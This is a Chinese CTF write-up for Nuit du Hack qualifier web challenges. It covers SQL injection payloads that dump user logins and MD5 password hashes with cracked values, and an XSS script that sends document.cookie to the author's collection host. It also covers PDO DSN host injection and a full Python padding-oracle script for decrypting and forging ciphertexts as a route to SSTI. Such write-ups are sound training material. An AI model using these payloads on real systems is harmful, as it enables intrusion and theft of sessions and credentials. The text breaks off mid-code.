然后根据初始登录页面的name猜到字段名分别是 login 和 password
    firstname='union select/*&lastname=*/login/*&position=*/,2,3,4,5,6 /*#&country=*/from users#123&gender=
    firstname='union select/*&lastname=*/password/*&position=*/,2,3,4,5,6 /*#&country=*/from users#123&gender=
得到三个用户名和三个md5的密码值,MD5解密之后登陆就拿到flag了
    #三个用户名
    ruleradmin
    patrick
    raoul
    #三个密码
    04fc95a5debc7474a84fad9c50a1035d #smart1985
    db6eab0550da4b056d1a33ba2e8ced66 #1badgurl
    7ac89e3c1f1a71ee19374d7e8912714b #1badboy
**Purple Posse Market**
进去之后研究半天,发现有一个contact页面可以提交一些东西,然后其他好像也没有太多用,题目描述让拿到管理员的IBAN账户。那多半是xss拿到cookie登陆后台了,然后在评论这里尝试提交,发现根本没有过滤,下面代码直接就能返回。
回到题目，既然没有过滤，那么直接执行js就好了，提交如下：
然后这个 request.js 这样写的
    $.get("http://你的xss平台?a="+document.cookie,function(data,status){})
截图如下:
登陆进去就能看到IBAN账户,这就是flag了。
**WhyUNoKnock**
一道挺有意思的题目，网址进去是一个登陆页面，登陆时候输入了3个参数，login password
group，前两个参数用户名和密码简单测试应该没问题，然后第三个参数，更改为其他字符就提示 PDOException : 1044
一开始猜测是表名注入，但是测试各种payload发现不符合sql语句的规范。后来本地测试的时候发现输入点可能在利用pdo连接数据库的时候选择的配置。然后猜测能够覆盖掉pdo的其他配置，输入group=users;host=test.dns.log:1234;然后有dns的记录和tcp请求的记录，证明输入点的确在这个位置。但是我们不知道数据库密码和数据库结构怎么办呢？心里有两个选项:
1.虽然他想连接一个mysql服务，但是我们不一定要给他一个真的mysql，可以自己写一个fake mysql
server或者在真正mysql返回的时候抓包替换返回值为自己构造的数据。2.修改mysql的配置解决这两个问题:先是利用参数skip-grant-table可以跳过认证，然后设置mysql日志抓取sql记录，然后通过sql去建立相应的数据库。这里选择了第二个方式。最后的sql日志如图
erpay即为服务器连接时的用户名，然后执行了一个select语句，通过构造出相应的admins数据库，增加一条记录，就能成功登陆，拿到flag。
**MarkIsFaillingDownDrunk**
进去之后随便点一个，发现链接变成这个
这一看都不用想，80%是`padding oracle`，
然后开始写代码，先把他的几串东西的明文搞出来，代码如下：
    import requests
    import base64
    import time
    url='http://markisfaillingdowndrunk.quals.nuitduhack.com/view/'
    N=16
    phpsession=""
    ID=""
    def inject(param):
        result=requests.get(url+param)
        #print result.content
        return result
    def xor(a, b):
        print "length",len(a),len(b)
        return "".join([chr(ord(a[i])^ord(b[i%len(b)])) for i in xrange(len(a))])
    def pad(string,N):
        l=len(string)
        if l!=N:
            return string+chr(N-l)*(N-l)
    def padding_oracle(N,cipher): ##return middle
        get=""
        for i in xrange(1,N+1):
            for j in xrange(0,256):
                padding=xor(get,chr(i)*(i-1))
                c=chr(0)*(16-i)+chr(j)+padding+cipher
                print c.encode('hex')
                result=inject(c.encode('hex'))
                if result.status_code!=500:
                    print j
                    get=chr(j^i)+get
                    break
        return get
    s=["deadbeefcafedeadbeefcafe04030201b2c7da6ca163321fc0e96e98df20b58389e055de04be2972edc654d2f609d9608bc083bf5f35eba62d7faf73d7ec7fec88743a46bbd5711e9f954f7f54c211a3ef30067df218e84a474ec00dc1789b3c053fd578c86f6e87e080a63c6191289cd4f2e5178882f36097ae40214323b2bde2491de75c6603a708b61f80efc07b2da2d626137891b74c7019b040db51f468a2d6978e726e5c35ad9ce7f1dbc06cba",
    "deadbeefcafedeadbeefcafe0403020152208110d1a06ce628ff8e10f4cbc1aa96ac276f57b6d80e50df1050c455fdf441aee00f376a598270a8d830ddf58ab489e053dbbfba4b30652f718567777364a07d5b453fb6ab946cc6ce6485f6250d583fbaac9fb0d169de6184a1c1fa0a30",
    "deadbeefcafedeadbeefcafe0403020131fdd089e91025df9510efa46b2085aac738ae5e03daa6495e2e4ee83283282a5be01dd6d817df2c0e69cd613c7da160a6aab9f02d175ac549feb6b674fa6f65",
    "deadbeefcafedeadbeefcafe0403020152208110d1a06ce628ff8e10f4cbc1aa96ac276f57b6d80e50df1050c455fdf440d56ae51399ceb30b5b69153ddc230219e3f662023665e8885c90867b8c3a02"]
    IV=s[0][:16]
    #str4
    ans=[]
    for i in xrange(4):
        c=[]
        str1=s[i].decode('hex')
        #print s[i]
        #print str1
        for j in xrange(0,len(str1),N):
            c.append(str1[j:j+N])
        l=len(c)
        print l
        p=[""]*l
        for j in xrange(l-1,0,-1):
            middle=padding_oracle(N,c[j])
            print "========================middle================================"
            print j
            print middle.encode('hex')
            p[j]=xor(middle,c[j-1])
            print p[j]
        print "==========================plain==============================="
        print i
        print p
        ans.append(p)
    print ans
由于服务器比较慢，
所以我是开了两个程序顺序反序一起跑，把第一串和第四串跑出来是个这样的东西，
    1：https://gist.githubusercontent.com/MarkIsFaillingDownDrunk/b9ed0141c97ae6488379dafa088c04d2/raw/4129795e82bb978e78b00bcb9b9fc4b6acb44898/test.mdx10x10x10x10x10x10x10x10x10x10x10x10x10x10x10x10
    4：https://raw.githubusercontent.com/dlitz/pycrypto/master/READMEx02x02
访问一下，内容是这个
    # Welcome to MarkParser !
    ## This is a simple Markdown test.
    Test for dynamic rendering :
    [{{ config['WEBSITE_NAME'] }}](/)
再看看它网页的内容
这样就明白了,
也就是说他的 view 后面直接跟的链接。他会读取链接的内容,然后进行 markdown 转换,然后在进行模板渲染。
所以接下来的思路也就很明确很简单了,让它访问我们的网站预先放好的 md ,然后就是个 ssti 了,通过一些奇怪姿势找
到执行命令或是读取文件的函数就行了。
这里由于有了第四个链接,所以构造一个目录如下:
第四个密文对应明文:
https://raw.githubusercontent.com/dlitz/pycrypto/master/READMEx02x02
我的网页: http://xxx.xxx.xx.xxx:8000/xxxxxxxxxxxxxxxxxxxxx/master/READMEx02x02
最后一组明文和他密文解密出来的一样,这样我就可以维持最后一个分组密文以及倒数第二个分组的密文不变了。然后依
次通过 padding oracle 获取中间值,与构造的密文异或得到构造的密文,从而得到我的网址对应的密文
至于具体 padding oracle 伪造明文的原理这里不赘述了。
代码如下:
    import requests
    import base64
    import time
    url='http://markisfaillingdowndrunk.quals.nuitduhack.com/view/'
    N=16
    phpsession=""
    ID=""
    def inject(param):
        result=requests.get(url+param)
        #print result.content
        return result
    def xor(a, b):
        print "length",len(a),len(b)
        return "".join([chr(ord(a[i])^ord(b[i%len(b)])) for i in xrange(len(a))])
    def pad(string,N):
        l=len(string)
        if l!=N:
            return string+chr(N-l)*(N-l)
    def padding_oracle(N,cipher): ##return middle
        get=""
        for i in xrange(1,N+1):
            for j in xrange(0,256):
                padding=xor(get,chr(i)*(i-1))
                c=chr(0)*(16-i)+chr(j)+padding+cipher
                print c.encode('hex')
                result=inject(c.encode('hex'))
                if result.status_code!=500:
                    print j
                    get=chr(j^i)+get
                    break
        return get
    '''
    s=["deadbeefcafedeadbeefcafe04030201b2c7da6ca163321fc0e96e98df20b58389e055de04be2972edc654d2f609d9608bc083bf5f35eba62d7faf73d7ec7fec88743a46bbd5711e9f954f7f54c211a3ef30067df218e84a474ec00dc1789b3c053fd578c86f6e87e080a63c6191289cd4f2e5178882f36097ae40214323b2bde2491de75c6603a708b61f80efc07b2da2d626137891b74c7019b040db51f468a2d6978e726e5c35ad9ce7f1dbc06cba",
    "deadbeefcafedeadbeefcafe0403020152208110d1a06ce628ff8e10f4cbc1aa96ac276f57b6d80e50df1050c455fdf441aee00f376a598270a8d830ddf58ab489e053dbbfba4b30652f718567777364a07d5b453fb6ab946cc6ce6485f6250d583fbaac9fb0d169de6184a1c1fa0a30",
    "deadbeefcafedeadbeefcafe0403020131fdd089e91025df9510efa46b2085aac738ae5e03daa6495e2e4ee83283282a5be01dd6d817df2c0e69cd613c7da160a6aab9f02d175ac549feb6b674fa6f65",
    "deadbeefcafedeadbeefcafe0403020152208110d1a06ce628ff8e10f4cbc1aa96ac276f57b6d80e50df1050c455fdf440d56ae51399ceb30b5b69153ddc230219e3f662023665e8885c90867b8c3a02"]
    IV=s[0][:16]
    #str4
    ans=[]
    for i in xrange(4):
        c=[]
        str1=s[i].decode('hex')
        #print s[i]
        #print str1
        for j in xrange(0,len(str1),N):
            c.append(str1[j:j+N])
        l=len(c)
        print l
        p=[""]*l
        for j in xrange(l-1,0,-1):
            middle=padding_oracle(N,c[j])
            print "========================middle================================"
            print j
            print middle.encode('hex')
            p[j]=xor(middle,c[j-1])
            print p[j]
        print "==========================plain==============================="
        print i
        print p
        ans.append(p)
    print ans
    '''
    cipher=[
            "deadbeefcafedeadbeefcafe04030201",
            "52208110d1a06ce628ff8e10f4cbc1aa",
            "96ac276f57b6d80e50df1050c455fdf4",
            "40d56ae51399ceb30b5b69153ddc2302",
            "19e3f662023665e8885c90867b8c3a02"
            ]
    middle=[
            'b6d9ca9fb9c4f182cc8ebdd0636a7669',
            '2742f463b4d20f89468beb7e80e5a2c5',
            'fb8343033ec2a22120a67322bd25899b',
            '6fb80b9667fcbc9c591e285170992100'
            ]